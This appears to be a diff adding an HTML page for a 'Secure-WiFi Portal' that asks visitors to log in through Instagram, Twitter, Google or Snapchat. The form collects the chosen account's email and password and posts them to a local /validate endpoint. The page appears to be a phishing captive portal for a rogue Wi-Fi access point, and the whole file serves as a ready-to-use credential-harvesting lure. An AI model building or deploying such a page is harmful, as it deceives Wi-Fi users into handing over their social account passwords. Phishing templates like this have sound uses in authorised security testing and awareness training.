@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>Secure-WiFi Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Secure-WiFi" />
+    <meta name="description" content="Your One Stop Secure WiFi Connection." />
+    <link rel="shortcut icon" type="image/x-icon" href="./favicon.ico" />
+    <link rel="stylesheet" href="./style.css" type="text/css" />
+  </head>
+  <body>
+    <div class="inner-container">
+      <ul id="icons">
+        <li>
+          <a href="#" title="Instagram" class="tooltip"
+            ><img src="social/instagram.png" alt="" class="icon"
+          /></a>
+        </li>
+        <li>
+          <a href="#" title="Twitter" class="tooltip"
+            ><img src="social/twitter.png" alt="" class="icon"
+          /></a>
+        </li>
+        <li>
+          <a href="#" title="Google" class="tooltip"
+            ><img src="social/google.png" alt="" class="icon"
+          /></a>
+        </li>
+        <li>
+          <a href="#" title="Snapchat" class="tooltip"
+            ><img src="social/sc.png" alt="" class="icon"
+          /></a>
+        </li>
+      </ul>
+      <div class="box">
+        <h1>Login</h1>
+        <form action="/validate" method="post">
+          <select name="social" class="list">
+            <option value="instagram">Instagram</option>
+            <option value="twitter">Twitter</option>
+            <option value="google" selected>Google</option>
+            <option value="snapchat">Snapchat</option>
+          </select>
+          <input type="email" name="username" required placeholder="Email" />
+          <input
+            type="password"
+            name="password"
+            required
+            placeholder="Password"
+          />
+          <input type="submit" value="Login" value="Send" class="button" />
+        </form>
+        <p>
+          <img
+            src="./images/secure_wifi.png"
+            class="lock"
+          />Secure-Wifi<br /><br /><small
+            >No registration needed. Simply log in with your social
+            account.</small
+          >
+        </p>
+        <a href="#" class="logo"><img src="./images/logo.png" /></a>
+      </div>
+    </div>
+  </body>
+</html>
